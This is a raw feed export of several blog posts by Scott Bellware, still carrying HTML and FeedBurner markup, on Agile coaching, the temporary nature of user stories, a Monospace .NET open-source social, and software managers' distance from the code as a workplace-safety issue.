border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=_jtbCWIzoCY:05cfIfRJsXI:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/_jtbCWIzoCY\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1058}}

Womack: \"We've got too little management and therefore need too much leadership\".<br /><br /><object width=\"480\" height=\"385\"><param name=\"movie\" value=\"http://www.youtube.com/v/96EasliJuuA?fs=1&hl=en_US\"><param name=\"allowFullScreen\" value=\"true\"><param name=\"allowscriptaccess\" value=\"always\"><embed src=\"http://www.youtube.com/v/96EasliJuuA?fs=1&hl=en_US\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"480\" height=\"385\"></embed></object><br /><br />Someone who has become specialized as an Agile coach necessarily benefits from the perpetuation of Agile coaching. This doesn't mean that Agile coaches are nefarious and interested in suboptimal outcomes, but perpetuated specialization typically creates narrowed perspectives and thus overly-narrow interpretations of conditions and needs.<br /><br />The result is often the very same counter-productivity that we observe when someone is given the exclusive job of capturing requirements for a software project: they fill all of their time exercising their specialization, creating an inventory of work that is out of sync with the progress of the team.<br /><br />When we bring Agile coaches into software development efforts, we should recognize the underlying problem that is being signaled: that software development managers are not presently equipped to manage the software development work that they've been tasked to manage.<br /><br />By failing to recognize the underlying problem, we often go too lightly into engagements with Agile coaches, and we end up failing to use them to solve the root cause problem, and this perpetuates the need for longer engagements with Agile coaches. This, in turn, drives Agile coaches further into the reaches of specialization, and narrower perspectives, accelerating the erosion of their usefulness.<br /><br />To break this cycle, we need to recognize the most important reason to bring on an Agile coach: The purpose of an Agile coach is to transform managers and the management system so that managers, in turn, can transform<span style=\"font-style: italic;\">their</span>organizations.<br /><br />Coaches initially take on responsibilities that ultimately need to be the responsibilities of a manager. Even if the outcome is an improvement, when a manager's job is split between an authority position (the Boss), and a guidance position (the Coach), the outcome isn't as good as it can and should be. Nonetheless, if a manager is in a position to need a coach, then the coach is inevitably going to take on some of the manager's responsibilities for teaching and transformation while the manager undergoes rehabilitation of his own.<br /><br />The coach and the manager must recognize that these conditions are a necessary evil. The goal is a transition away from the split direction of a team between a manager and a coach. The longer that this split is in place, the higher the likelihood that the new behaviors learned by the team will be undone by the manager when the coach moves on.<br /><br />Agile coaches can find themselves as removed from the work of software development as the managers that they are called to rehabilitate in the work. For an Agile software development coach to remain effective, he has to be an active software developer. Just as managers fall into the trap of<a href=\"http://blog.scottbellware.com/2010/09/manager-or-bully.html\" target=\"_blank\">losing software development currency</a>, so do Agile coaches. An Agile coach who doesn't<span style=\"font-style: italic;\">also</span>do software product development for a living is a ticking timebomb of counter-productive guidance for a software development team.<br /><br />Consider this quote from<a href=\"http://www.whattofix.com/blog/archives/2010/09/agile-ruined-my.php\" target=\"_blank\">Daniel Markham</a>: \"If you're going to train something, you should be able to do it. And I mean do it to a very high level of expertise. An agile coach should be able to code, perform analysis, manage the project, test -- anything that needs doing on a project. If she can't, then how can you talk to her about your particular situation? If your agile trainer was a BA last week, or never slung code in his life, or is a professional trainer, or -- let's be brutally honest -- is making less than the members of the team are, you've got a dud. It seems like common sense but it bears repeating: you can't train something you haven't done. And \"done\" means a bunch of times, not just on the pilot project.\"<br /><br />The qualities and abilities that Daniel outlines are qualities and abilities that we need to expect from software development managers. If they don't have those qualities and abilities, they need to get them, and a coach might be a way to get there. If the coach doesn't have those qualities and abilities, most of what's produced during the engagement doesn't become lasting, transformative value.<br /><br />Agile coaches who themselves don't know the work of software development can't teach managers to know the work sufficiently to manage it. They can only teach them to become other disconnected Agile coaches. This is how the second half of the first decade of Agile came to be dominated by the doctrine of Servant Leadership. As more senior leaders in the Agile community spend more and more time in roles that are ever distant from the work of software development, Agile itself is becoming more robotic, more mindless, more of an orthodoxy, and even more of a liability than a benefit.<br /><br />Servant leadership is one approach - one tool - fit for the organizational conditions that it serves best. An Agile coach often embraces the edicts of servant leadership as a universal panacea when his duty to stay sharp in the full curriculum of software development is dulled by the ease of Agile coaching specialization. But any tool used indiscriminately is going to undo any benefits that it provided in the circumstances where it was an appropriate choice.<br /><br />A servant leader's typical proposition is that an organization's ability to meet expectations will be transformed if only its inherent creativity can be tapped and unleashed. While tapping and unleashing unused creativity is transformative, it's extremely rare that doing so is either sufficient or sustainable. It often creates conditions that not only lead to unmethodical exploration of ideas, but also makes teams feel that they have a right to this kind of behavior. In other words: \"self-determination\" rather than \"self-organization\".<br /><br />Servant Leadership as a panacea is also a real side-effect of past experiences with bully management. It's an over-compensation reaction to some very real and very tangible painful experiences of abusive directed authority. It's an equal and opposite reaction to an extreme. It, as well, is an extreme. It's as much an undesirable specialization of behavior as abusive directed authority. It's often a programmed predisposition, rather than a conscious choice informed by circumstance.<br /><br />The Servant Leadership doctrine often patently dismisses the greater goal of balance between directed authority and creative enablement, almost entirely eschewing the value of<span style=\"font-style: italic;\">informed</span>directed authority and<span style=\"font-style: italic;\">skilled</span>directed authority in favor of an over-indulged creative enablement.<br /><br />A job in creative enablement is a lot of fun, and many Agile coaches have come to feel entitled to these kinds of engagements. They're light, they're fluffy, they can come with no measurable expectations, and they're often damned lucrative - especially in software organizations in the thick of the detritus of an unrecognized management crisis.<br /><br />The increasing prevalence of Servant Leadership also presents a great opportunity for consultants with little real experience in Agile to re-brand themselves as Agile consultants. It allows for anyone with even a modicum of summary knowledge of Agile development to have a role in the Agile bonanza. But we all lose when this happens.<br /><br />If you don't already know what your problem is, then pre-supposing an Agile(tm) solution further deepens the mindlessness of robotic management, and it diminishes the Agile body of knowledge. And ultimately, it exposes our organizations to the risks of bringing in help that may only have the ability to talk the talk - which is often all that is required of Servant Leadership - and often all that servant leaders assert is required of them.<br /><br />Again from<a href=\"http://www.whattofix.com/blog/archives/2010/09/agile-ruined-my.php\" target=\"_blank\">Daniel Markham</a>: \"One guy (famous author again) basically put it like this to me when I told him the team wasn't succeeding: I'm here to demonstrate certain practices and to show that they work, not to just stop everything and attend to what the team is dealing with today.\"<br /><br />To move forward through this crisis, we need to set new goals for software development management: To be close enough to the work to be able to manage work, and to use directed authority in service of helping the team meet expectations when creative enablement turns \"self-organization\" into entitlements for excessive experimentation.<br /><br />And we need to re-define the role of coaches from servant leaders to temporary co-managers, helping the team to meet expectations while bully management and its detritus is transformed into effective software development management.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=H7Tle_fgelA:ZiUCtxXmVFU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=H7Tle_fgelA:ZiUCtxXmVFU:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/H7Tle_fgelA\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1059}}

The implications for user stories should be obvious: User stories are temporary. Saving them for posterity doesn't serve the primary purpose of user stories, and doing anything that makes them less temporary can turn user stories from benefit to detriment.<br /><br />User stories are a bit of semi-refined raw material that systems are created from. They're a way to represent users' needs. Most importantly, they communicate an understanding of users' context to the people who are building the software. User stories help to make it more difficult for software development teams to succumb to the ever-present threat of losing track of the user's bigger picture.<br /><br />Aside from raw human ideas that user stories represent, they are the most flexible artifact in software development. Then can be created at any time. They can be changed at will. They can be combined. They can be subdivided. They're not intended to become fixed, and anything that serves to make them fixed is a disservice to the value they offer. User stories aren't fixed in a point in time, just as needs aren't fixed. They change because conditions change. They change because our own understandings change and improve as we gain the clarity that comes from working with user stories, and from building the products that satisfy needs.<br /><br />When we realize new clarity, our responsibility is to reflect that new clarity in the form of new stories, or new subdivisions of existing user stories, or through the combination of existing user stories, and even from the removal of user stories from the product definition entirely.<br /><br />The user stories that describe our needs tomorrow are going to be different from today's. Knowing this as we do, we have we gone from recognizing the transient, temporary nature of user stories to the point where we now tend to capture them in tools that make them harder and to change, and harder to take in at a glance and to glean new clarity from. When we do this, we're increasingly unlikely to update user stories to reflect the improved understand we cultivate as we work with them, with users, and with the software that we're developing.<br /><br />The more that we calcify user stories in ever more concrete media, the less we make necessary course corrections along the way. There is little that so obviously contradicts \"Agile\" more than inviting anything that adds to the calcification of requirements. A principle duty of user story management in Agile development is to protect them from becoming encumbered by the notions of permanence that obstructed software development methodologies that predate the effectiveness of Agile methods.<br /><br />We pat ourselves on the back for having evolved beyond the quintessentially-primitive \"300-page requirements document\", but often all we're doing is bringing some of the same old problems forward to our \"new\" requirements formats. Sure, we've outgrown the massive, big-batch requirements doc, but the genetic material of the disease that infected those documents have evolved into a newer problem for newer artifacts, and ultimately, the problem is still the same essential problem. We're so pleased with ourselves for our new Agile ways that we fail to see that we're repeating the same mistakes, except with new material.<br /><br />Here are some things to keep in mind that can help with the relapse into the same old mistakes:<br /><br />1. When you forget why you're doing something the way you do, the answer isn't in a user story archive. The answer is in revisiting what you're doing to make sure that it still holds true. Do this with interactions and with people. Use tools and processes to support the human interactions.<br /><br />2. User stories are not artifacts for regulatory compliance. User stories are a scratch pad of human understanding at the present moment. They are chuck for the software development grinder. What comes out the other end should be the software that itself explains why things are as they are. If you need a permanent record for the purposes of regulatory compliance, go ahead and create one. Nothing in Agile stops you from doing that. Just don't hang a stasis anchor around the neck of user stories. If you do, you'll strip them of the benefit that they bring to software delivery.<br /><br />3. Have one master copy of a user story while that user story is in-progress. The master copy should be the one that is most immediately accessible to the most people who are involved in turning ideas into software products. They should be be posted using the most visible medium possible - one that requires the least amount of human interaction to casually-scan a project's gallery of user stories.<br /><br />4. Throw user stories away once you deliver the working software that addresses the needs expressed by user stories. The software and its supports are enough to describe why it is the way it is. If you no longer remember, and if the software and its supports and the mechanisms and practices of institutional memory aren't sufficiently self-descriptive, revisit all of these issues as an opportunity to improve the production system in a way that doesn't invite more tool-centric bureaucracy.<br /><br />Here's a bit of a side note to consider: The principle sponsors of the Agile 2010 conference are both \"Agile\" tool vendors.<br /><br />If one of Agile development's primary tenants is to value people and interactions over processes and tools, how is it that the only Agile organizations producing enough disposable income to support Agile development itself are tool and process companies specializing in Agile requirements management and requirements compliance? Somehow, we've walked in a circle - yet again. And one of the things we've left on the trail behind us is the understanding of how things went wrong last time, as well as our commitment to avoid expediencies that don't serve sustainability.<br /><br />The process methodologies that predate Agile are often roundly dismissed by agilists. But there wasn't really inherently wrong with them. Things back then started getting silly when tools started getting silly; when we began to defer to tools as authorities rather than to the people needing and the people solving needs.<br /><br />One of the first definitive steps into the downward spiral of mindless process bureaucracy hell is the calcification of requirements. And no matter how temping it is to succumb to the materialism of hardened collections of user stories, we don't get to hell without passing through those gates.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=7zP3gI6GUYY:TGUeeWKO2Rk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=7zP3gI6GUYY:TGUeeWKO2Rk:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/7zP3gI6GUYY\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1060}}

Cap off your day with complimentary refreshments and a look at some of the community projects that have changed the face of .NET.<br /><br />Did you know that you can run .NET applications on iPhone and Android using the Mono Project's open source implementation of the .NET stack? Mono will also let you run your apps in powerful and mature cloud platforms like Amazon EC2 and build for special purpose hardware platforms. Want to deploy your apps to Linux and Mac? No problem, that's what Mono does for you. Use your C# skills to go further than you ever thought possible, and you don't even have to leave Visual Studio!<br /><br />Not only has the open source community made cross-platform .NET development a reality for all .NET developers, but open source provides a wealth of development tools that have become the leading indicator and the gold standard for where .NET software development is heading. Unit testing, ORM, build scripts, UI testing, MVC, continuous integration, source control... all of these fields were led by open source efforts years before they started showing up in commercial products. Stop waiting to find out where .NET development is going! Come to Monospace and greet the future right here in the present!<br /><br />If you don't have any experience with open source, join the party and see what the fuss is about. Learn about the wealth of tools available to you as a .NET developer, made available by some of the most accomplished and expert developers in the community. Get your questions answered by the pros, and get tips on how to augment your projects and your skills with the vast array of mature, stable, open source tools and products. This event is for you. You don't have to be an open source hacker to enjoy Monospace. Stick around and indulge your curiosity!<br /><br />If you're an open source user, add your voice to the conversation. There will be plenty of .NET developers with questions to answer and experiences to share. Participate in discussions and demonstrations and even get a chance to learn about projects that you haven't heard of yet. Bring your laptop and sit down with open source contributors and users for a little hacking and show and tell!<br /><br />Join Jackson Harper of the Mono Project, as well as myself, and many of the NDC speakers and attendees for a fun night of sharing and networking at the Monospace social.<br /><br />Check out this list of NDC people who are open sourcers: Rob Conery, Scott Allen, Ben Hall, Roy Osherove, James Gregory, Greg Young, Jon Skeet, Robert C. Martin, Michael Feathers, Louis Dejardin, Sebastien Lambla, Shay Friedman, Anders Norås, Kevlin Henney, Lisa Crispin, Richard Campbell. And that's just a partial list! Come out to Monospace and find out what attracts these leading thinkers and practitioners  to open source solutions.<br /><br />Expand your .NET horizons at the Monospace social at the Norwegian Developers Conference.

On the other hand, managers verily require that software development workers undertake some of the riskiest behavior in the contemporary workplace. It's entirely common that software managers require workers to undertake work the crosses the line of being merely questionable, and moves squarely into the territory of negligence. It's not because software development managers are nefarious, but because they are too-often far enough removed from the work of software development to differentiate negligent and hazardous decisions from safe and sound decisions.<br /><br />Without a tangible understanding of the work undertaken by software workers on a day-to-day basis, and an understanding of that work in great detail, software managers are not equipped to know when they are requiring software workers to supplant safety with expediency.<br /><br />Workplace safety is an issue of productivity. Lack of safety breeds low productivity. In the case of software development, \"safety\" is an issue of undertaking work in a fashion that doesn't expose the software worker to unnecessary risk - especially risk that is easily avoided. That is, it's easily avoided for someone who understands the work of software development at a high-enough level of expertise and detail to guide workers away from unsafe practices.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TI2Z2EfT3DI/AAAAAAAAAI0/WqgstL6bWVY/s1600/1210439203-housekeeping.jpg\"><img style=\"margin: 0pt 0pt 0px 10px; float: right; cursor: pointer; width: 227px; height: 320px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TI2Z2EfT3DI/AAAAAAAAAI0/WqgstL6bWVY/s320/1210439203-housekeeping.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516234272795778098\" border=\"0\" /></a><br />An unsafe practice in software development is any work done in the present moment that makes work in the next moment take longer to complete. A reasonable analogy for this is the notion in physical materials work of a clean workplace.<br /><br />The purpose of a clean workplace is to remove the clutter that hides unseen, unsafe conditions. It's a lot easier to trip over an errant piece of material in the workplace when its surrounded by a profusion of other errant materials. When hazards are so common that they blend into the background, we simply stop noticing them, and this is how we come to be put at greater risk.<br /><br />The more unsafe clutter we have in our workplace, the more we have to work around. The more we have to work around, the more time it takes us to do work.<br /><br />If a manager can't detect the conditions that makes work take longer to accomplish than expected, he doesn't adjust his expectations for cycle time accordingly. This means that he expects more to get done - the original work, plus the workaround work - in an amount of time that would be reasonable for the completion of the original work alone.<br /><br />This makes workers even more careless, exacerbating the accumulation of obstructions and hazards in the software development workplace as a result. It's a vicious cycle that usually only happens because someone with the authority to avoid problems in the first place doesn't have the experience to recognize the problems and to deal with them.<br /><br />In the words of the ancient Chinese workflow master, Lao Tzu: \"Confront the difficult while it is still easy. Accomplish the great task by a series of small acts.\"<br /><br />Although, you can only do those small tasks if you can detect their presence. The finer your ability to perceive counter-productive deviations, the quicker you can respond to them. The longer you wait, the further off-course you'll be when you finally realize that you need to make a course correction. Someone who doesn't do work can't recognize when that work is off-course. Someone who isn't an expert in the work can recognize when the work is off-course, but his will only recognize it after it has become more expensive to deal with than necessary.<br /><br />And this, as the average software worker would tell you, is the day-to-day conditions in which their work is done. Software work is a constant battle fought against the accumulation of hazardous clutter. Software workers rarely get ahead of the clutter curve, and have to invest significant effort to keep their workplace free of hazards. Paraphrasing<a href=\"http://en.wikipedia.org/wiki/Taiichi_Ohno\" target=\"_blank\">Taiichi Ohno</a>, if you're not moving forward, you're falling behind.<br /><br />Each individual scrap of hazardous material in software development is typically quite small - small enough in fact to be easily deemed negligible - even by people who do the work. The hazard presented by two iota of hazardous waste in software isn't the sum of the hazards - it's the sum of the hazards compounded by some multiplier. Hazards in software don't exist in isolation, they interact with each other creating a higher order of hazards that is greater than the sum of their parts. Two pieces of hazardous software that interact with each other don't create two hazards, they create two hazards compounded by the amount of interactions between these modules. To make matters worse, all modules that interact with hazardous modules in close adjacency also get infected. Lack of day-to-day expertise in software work often leads to negligent underestimation of the risks associated with the \"<a href=\"http://blog.scottbellware.com/2009/02/design-flaws-hernias-and-anemic-quality.html\" target=\"_blank\">design hernias</a>\".<br /><br />Software hazards compound very quickly. It's very easy to arrive at an explosive accumulation of hazardous software materials. It can happen within the first few days of a software project. If subtle hazards in the tools and frameworks that programmers are slated to use are not recognized immediately, the accumulation begins before the first line of code is even written.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://1.bp.blogspot.com/_rt8zZqKCZSg/TI2batnXGrI/AAAAAAAAAI8/MBgv_KkEcCs/s1600/main.jpg\"><img style=\"margin: 0pt 0pt 0px 10px; float: right; cursor: pointer; width: 226px; height: 320px;\" src=\"http://1.bp.blogspot.com/_rt8zZqKCZSg/TI2batnXGrI/AAAAAAAAAI8/MBgv_KkEcCs/s320/main.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516236001822317234\" border=\"0\" /></a><br />When we ask software workers to continue to work in such conditions, we might as well send them into a mine filled with coal dust and require them to hyperventilate for several hours each day. Sooner or later they are going to have to escape the job to escape the hazards, or they are going to acquiesce to the irreconcilable differences between a manager's expectations and the realities of the working conditions that the manager himself feels entitled to not be exposed to for having already \"paid his dues\". This creates dispassionate cynicism in software developers. They come to learn that no matter what they do until they escape the work, they are more than likely going to end up on the losing end of the software work proposition. They learn that they'll get hung with the detritus of negligent software development decisions and direction because decision makers are too far removed from the work to see that it is these critical decisions and directions (or the lack thereof) that are the root cause.<br /><br />In these working conditions, workers constantly face obstructions that are only in-place because they weren't recognized when they were mere seeds of problems rather than towering oaks of looming counter-productivity.<br /><br />The accretions of hazards into founts of the depressed productivity that is status quo for most software teams is fully and completely avoidable - if only the hazards are dealt with when they are small. To see looming hazards when they're small, you have to have detailed knowledge of the work in the here and now. This is simply not possible when managers have removed themselves from the work.<br /><br />It's far too common for software development managers to feel entitled to be removed from the work of software development - as if removal from the work is a reward for having done the work for a number of years. The reward for doing software development work for a number of years is not an escape from the work, but an immersion into a far deeper understanding of it so that its expert insight can guide software work away from hazards. Of all the escapes that can be orchestrated by software workers, an escape into management is indeed and in fact an act of pure negligence.<br /><br />Software work is works in intangibles. Software hazards go unnoticed because they are physically invisible. Taking a bit of liberty with Donald Reinertsen in The Principles of Product Development Flow, we don't see the manifestation of software development safety issues \"when we walk through the engineering department.\" They're \"bits on a hard drive, and we have very big hard drives in product development.\"<br /><br />Managers often try to compensate for their lack of detailed understanding through the use of summary representations like software diagrams. But software diagrams don't show the looming problems while they are still small; still manageable gathering storms that can be dissipated through judicious application of minimally-invasive countermeasures. Only flagrant hazards can be detected in summary representations. Small, detailed course corrections can't be plotted from coarse, summary information. And yet managers who feel entitled to be removed from the work perpetuate the fantasy that summary representations like diagrams are sufficient to bring their purview into action on the software projects they manage. This is pure folly, and software tool vendors are quite happy to continue to exploit it.<br /><br />By the time you've detected a software hazard that can be seen in a summary representation like a software diagram, you're looking at a problem that has festered for far too long. You should be able to detect the chemical markers of the disease long before you notice that lump in a vital organ.<br /><br />Programming work is almost entirely mental. Its effectiveness is influenced by psychology, cognition, awareness, and communication far more than by any material concern like ergonomics, an ultra-fast workstation, or multiple monitors. Software systems are far too large and far too complex to be held in entirety in the conscious focus of any single software worker in any single moment. The devil is always in the details. Summary representations are secondary to the actual raw materials of software: the code. You have to be in the code, and to know enough about code to understand which subtle design differences are looming problems and which aren't.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2dCAkwEBI/AAAAAAAAAJM/RiDV-EschVY/s1600/P738_full.jpg\"><img style=\"margin: 0pt 0pt 0px 10px; float: right; cursor: pointer; width: 244px; height: 320px;\" src=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2dCAkwEBI/AAAAAAAAAJM/RiDV-EschVY/s320/P738_full.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516237776438169618\" border=\"0\" /></a><br />The average software system is a dark coal mine filled with the poison particulate of tomorrow's case of black lung. We ask developers to work in these conditions every day. We do this because at some point in our careers as managers, we believed that we were entitled to be removed from the details of software work.<br /><br />Sooner or later, enough hazardous software material accretes in a software system that managers step in, and often the first thing they do is look for a root cause in the workmanship of the software workers. The workmanship is rarely the root cause. The absence of informed, skilled, and insightful software management and guidance is always a preeminent cause to unattended workmanship. The workmanship is, of course, a problem, but it's a side-effect.<br /><br />This is like blaming miners for an underground explosion due to the accumulation of day-to-day hazards that result from institutionalized negligence of clear and present dangers that should be managed the moment that they show their first signs. We ask workers to undertake work that they know is not in their best interest. We ask them to do this from our organizational perches far about the hazardous conditions of software projects. And then we hang them with the inevitable costs of this kind of mismanagement.<br /><br />It's the software worker that is required to spend extra time in the mine to balance productivity that is lost to management negligence. It's the software worker who is required to take on the duties on sanitizing data by hand without the safety of the proven automation that should have been built right to begin with. We ask them to validate the decisions that we've made about the tools that they'll use in their work based on little more than a compelling sales pitch from a tool vendor who claims to knows more about the day-to-day work of the software developers in our organizations than we do - vendors who are even further removed from the work than we are.<br /><br />We ask software developers to work against their own interests and the interest of our organizations because we don't understand the hazards that our decisions create.<br /><br />Software workers suffer disruptions to their lives and their livelihoods when this kind of institutionalized negligence drives work policy on software projects. They shoulder the accumulated detritus of uninformed and unskilled management decisions. And they suffer the humiliation of blame when lack of management insight can't see it's own reflection in the root cause mirror. And institutions lose the invaluable institutional knowledge when workers escape the organization altogether. It's always a no-win situation. Everyone loses. And it's completely avoidable.<br /><br />If you're not willing to be in the day-to-day work of software development, you're declaring loud and clear that you're not qualifying yourself for the authority to make decisions that direct software work. Every decision you make risks adding to the accumulation of software hazards. When you do this, you deplete the workplace safety for software workers. You ask them to take risks that the workers themselves know that you can't see, and they know that because you can't see them, that you will likely not understand that the accumulation of avoidable hazards into full-fledged, clear and present dangers is your fault to begin with.<br /><br />Workplace safety is a serious productivity issue. It's a serious issue for the health of workers. It's a basic expression of human respect for the people who work for software development organizations. Understanding workplace safety for software developers requires a high level of expertise in software development, and it requires day-to-day currency in software development. A manager who is not willing to have insight into the details of the work that he is responsible for is patently disrespectful of his workers. He constantly puts them into harm's way by presuming to express authority without knowing whether his expectations are hazardous to the health, well-being, and viability of software work and software workers. Beyond disrespectful, it's dishonorable.<br /><br />The software field isn't at risk of programmers forming a united front and leveraging collective bargaining, and frankly such a thing isn't likely what anyone wants. But dealing with the root cause issues that have driven other industries to such actions is a win for everyone when obstructions to productivity are removed in the process. Addressing software development workplace safety is a good place to start - especially in our current economic conditions, where a massive boost of unimaginable untapped productivity would be a welcome change indeed.<br /><br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2cXMwotPI/AAAAAAAAAJE/klxfJNBgGIM/s1600/20050905_fg27.jpg\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 214px; height: 320px;\" src=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2cXMwotPI/AAAAAAAAAJE/klxfJNBgGIM/s320/20050905_fg27.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516237040974869746\" border=\"0\" /></a><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=oL7ssLp0ICQ:DmLZK_UDVCI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a 